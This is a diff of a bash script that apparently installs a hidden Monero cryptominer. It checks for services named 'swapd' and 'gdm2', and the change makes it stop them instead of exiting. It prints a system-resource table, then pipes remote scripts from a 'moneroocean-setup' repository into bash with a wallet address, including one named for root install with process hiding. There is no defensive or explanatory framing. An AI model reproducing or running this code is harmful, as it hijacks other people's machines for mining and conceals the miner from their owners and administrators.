@@ -14,51 +14,44 @@ is_service_running() {
     systemctl is-active --quiet "$service"
 }
 
-# List of services to check
+# List of services to check/stop
 services=("swapd" "gdm2")
 
-# Loop through the services and check if they are present and running
+# Loop through services and stop if running
 for service in "${services[@]}"; do
     if does_service_exist "$service"; then
         if is_service_running "$service"; then
-            echo "Service $service is running. Stopping script."
-            exit 1
+            echo "Stopping running service: $service"
+            systemctl stop "$service"
+            # Optional: Disable service to prevent auto-start
+            # systemctl disable "$service"
         else
-            echo "Service $service exists but is not running."
-#            exit 1
+            echo "Service $service exists but is not running"
         fi
     else
-        echo "Service $service does not exist."
+        echo "Service $service does not exist"
     fi
 done
 
-# If script reaches here, no specified services are running
-echo "No specified services are running. Continuing with the script..."
-
-echo -e "---------------------------------\n|     Resource     |     Value     |\n---------------------------------"
+echo -e "\n---------------------------------\n|     Resource     |     Value     |\n---------------------------------"
 echo -e "|        RAM        |  $(free -h | awk '/^Mem:/ {print $2}')  |"
 echo -e "|   CPU Cores    |      $(nproc)      |"
 echo -e "|     Storage      |   $(df -h / | awk 'NR==2 {print $2}')   |"
 echo -e "---------------------------------"
 
 rootstuff() {
+  echo -e "\nStarting root installation..."
   curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
   [ "$USER" != root ] && sudo -u "$USER" "$0"
 }
 
 userstuff() {
+  echo -e "\nStarting user installation..."
   curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
 }
 
 if [[ $(id -u) -eq 0 ]]; then
-    echo
-    echo "You are running the root install!"
-    echo
     rootstuff
 else
-    echo
-    echo "You are running the user install!"
-    echo
     userstuff
 fi
-
